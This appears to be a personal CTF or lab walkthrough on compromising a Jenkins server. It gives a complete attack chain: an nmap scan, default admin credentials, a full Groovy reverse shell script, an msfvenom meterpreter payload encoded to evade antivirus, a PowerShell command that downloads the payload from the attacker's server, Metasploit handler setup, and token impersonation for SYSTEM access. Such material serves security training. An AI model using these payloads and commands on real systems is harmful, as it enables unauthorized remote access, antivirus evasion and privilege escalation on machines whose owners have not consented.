Abusing Jenkins Server:

1-Enumeration:
    nmap -T5 -Pn -sC -sV <IP> -oN enum/sanLogs1.logs  -vv
        PORT     STATE SERVICE    REASON          VERSION
        80/tcp   open  http       syn-ack ttl 128 Microsoft IIS httpd 7.5

        3389/tcp open  tcpwrapped syn-ack ttl 128

        8080/tcp open  http       syn-ack ttl 128 Jetty 9.4.z-SNAPSHOT

        MAC Address: 02:2C:C0:D7:67:29 (Unknown)

        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


        Port 8080:
            admin admin

 

2-Exploit Jenkins:
    Reverse shell:
        https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

        reverse_shell code:

            String host="<KALI IP>";
            int port=<KALI PORT>;
            String cmd="cmd.exe";
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

 

 
    Metasploit:
 

        Let's use the incognito module via Metasplooit:

        To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.


        Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
            msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe


        This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.


        After creating this payload, download it to the machine using the same method in the previous step:
            powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"


        Before running this program, ensure the handler is set up in Metasploit:
            use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
            python3 -m http.server


        This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell
        Start-Process "shell-name.exe"


    Privelge Escalation via Metasploit:

        let's use token impersonation to gain system access via LSASS:

            There are two types of access tokens:
                -Primary access tokens: those associated with a user account that are generated on log on
                -Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process


        View all the privileges using whoami /priv

        You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. 
        Let's use the incognito module that will allow us to exploit this vulnerability.

        
        Incognito:
        Enter: load incognito to load the incognito module in Metasploit. Please note that you may need to use the use incognito command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.

    
            No answer needed
            To check which tokens are available, enter the list_tokens -g. 
            We can see that the BUILTIN\Administrators token is available.

            Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. 
            

        Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - 
        it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).
        Ensure that you     migrate to a process with correct permissions (the above question's answer). 
        The safest process to pick is the services.exe process. First, use the ps command to view processes and find the PID of the services.exe process. 
        Migrate to this process using the command migrate PID-OF-PROCESS


 

 

